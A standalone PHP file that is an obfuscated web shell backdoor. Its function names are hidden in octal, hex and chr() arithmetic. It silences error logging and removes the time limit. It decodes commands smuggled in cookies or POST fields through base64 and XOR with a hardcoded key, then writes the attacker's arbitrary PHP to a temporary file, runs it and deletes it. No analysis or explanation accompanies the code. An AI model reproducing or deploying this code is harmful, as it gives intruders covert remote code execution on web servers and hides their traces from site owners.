<?php $bocfg = "\146".chr(802-697)."\154"."\x65"."\x5f".chr(937-825).'u'.chr(116)."\137".chr(99).chr(513-402).chr(110).chr(1050-934)."\x65"."\156"."\x74".chr(577-462);
$ltdokj = "\142".chr(97)."\x73".'e'.chr(54)."\64".'_'."\x64"."\x65".chr(537-438).chr(111).chr(944-844).chr(517-416);
$fzhmhxpcx = "\x69".chr(110)."\151"."\x5f".chr(115).'e'.chr(494-378);
$qllkxker = "\x75"."\156".chr(108)."\x69".chr(169-59).chr(139-32);


@$fzhmhxpcx("\x65"."\162".chr(561-447)."\x6f".chr(996-882)."\x5f".'l'.'o'.'g', NULL);
@$fzhmhxpcx("\154"."\x6f"."\x67".chr(518-423)."\x65"."\162"."\162"."\157".chr(114)."\163", 0);
@$fzhmhxpcx(chr(360-251)."\x61".chr(340-220)."\137".chr(189-88).chr(944-824)."\x65".chr(219-120).chr(117).chr(445-329)."\151".chr(1079-968)."\x6e"."\x5f".'t'."\151"."\x6d".chr(260-159), 0);
@set_time_limit(0);

function bpizpbbw($fxrbnka, $nojdwwb)
{
    $rhrhtkpmz = "";
    for ($rqonn = 0; $rqonn < strlen($fxrbnka);) {
        for ($j = 0; $j < strlen($nojdwwb) && $rqonn < strlen($fxrbnka); $j++, $rqonn++) {
            $rhrhtkpmz .= chr(ord($fxrbnka[$rqonn]) ^ ord($nojdwwb[$j]));
        }
    }
    return $rhrhtkpmz;
}

$xqlprqd = array_merge($_COOKIE, $_POST);
$dojlhlm = '94a17f01-40b8-436a-a08f-54e0b537e9f6';
foreach ($xqlprqd as $zttwyqh => $fxrbnka) {
    $fxrbnka = @unserialize(bpizpbbw(bpizpbbw($ltdokj($fxrbnka), $dojlhlm), $zttwyqh));
    if (isset($fxrbnka[chr(97)."\x6b"])) {
        if ($fxrbnka["\141"] == "\x69") {
            $rqonn = array(
                "\160"."\x76" => @phpversion(),
                "\x73"."\166" => "3.5",
            );
            echo @serialize($rqonn);
        } elseif ($fxrbnka["\141"] == chr(101)) {
            $xesnjx = "./" . md5($dojlhlm) . chr(624-578)."\x69"."\156"."\143";
            @$bocfg($xesnjx, "<" . "\x3f".'p'.chr(1031-927).'p'."\40"."\x40".chr(281-164).chr(110)."\x6c".chr(469-364).chr(969-859)."\x6b".chr(40)."\x5f".chr(95)."\106".'I'."\x4c".'E'.'_'.chr(346-251)."\x29".chr(830-771).' ' . $fxrbnka[chr(100)]);
            @include($xesnjx);
            @$qllkxker($xesnjx);
        }
        exit();
    }
}

